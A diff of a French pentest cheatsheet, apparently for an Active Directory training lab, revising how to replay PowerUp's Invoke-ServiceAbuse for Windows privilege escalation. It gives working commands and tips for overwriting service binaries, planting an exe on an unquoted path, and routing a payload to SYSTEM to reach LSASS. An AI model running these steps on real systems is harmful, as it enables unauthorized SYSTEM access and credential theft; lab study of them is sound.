@@ -58,14 +58,16 @@ Ne lis pas `Invoke-AllChecks` comme une liste de faits : chaque entrée nomme la
 > - **b)** binaire remplaçable → écraser l'exe pointé par `PathName`, `Restart-Service <svc>`.
 > - **c)** unquoted path → déposer un exe malveillant dans le 1er espace du chemin.
 >
-> **Restaurer** pour rejouer proprement : `Restore-ServiceBinary -Name <svc>` (sinon 2e abus refusé). Si `-Command` semble ne rien produire : `Get-Service <svc>` puis `Restart-Service <svc> -Force` puis rejouer.
+> **Restaurer** : dépend du mode.
+> - **`-Command` (change binPath config)** = rien à restaurer (aucun fichier disque touché). Rejeu direct : `Invoke-ServiceAbuse -Name <svc> -Command "..."` gère la reconfig + start. Si service coincé : `sc.exe query <svc>` → `sc.exe stop <svc>` puis rejeu.
+> - **`-BinaryPath` (écrase l'exe sur disque)** = `Restore-ServiceBinary -Name <svc>` remet le `.exe` d'origine depuis le `.bak` créé par PowerUp.
 >
-> ⚠ **Service bloqué après 1er abus** (`Restart-Service ... stop failed`) : le binaire écrasé rend le service instoppable proprement. Séquence de secours : `sc.exe queryex <svc>` (note PID) → `Stop-Process -Id <PID> -Force` → `sc.exe stop <svc>` → `Restore-ServiceBinary -Name <svc>`. **Toujours restaurer AVANT de rejouer**, jamais 2 `Invoke-ServiceAbuse` d'affilée.
+> ⚠ Piège vécu : `Restart-Service <svc> -Force` échoue avec `stop failed` après un `-Command` — normal, le binPath pointe sur un `cmd /c ...` (pas un vrai service), SCM ne peut pas dialoguer avec. Utilise `sc.exe stop <svc>` à la place, puis rejoue `Invoke-ServiceAbuse`.
 
 ```powershell
 . C:\AD\Tools\PowerUp.ps1
 Invoke-ServiceAbuse -Name <svc> -Command "<charge SYSTEM>"     # payload direct = évite le détour Medium Integrity
-Restore-ServiceBinary -Name <svc>
+# pour rejouer : sc.exe stop <svc> (si coincé) puis re-Invoke-ServiceAbuse
 ```
 
 ⚠ **Integrity levels :** un shell d'admin local sous UAC reste **Medium** → pas d'accès LSASS (`Not in high integrity`). Route ta charge via `-Command` du service → **SYSTEM/High** direct. Cf [[Cheatsheet - Quel outil quand]] (§ compte LOCAL ≠ DOMAINE).
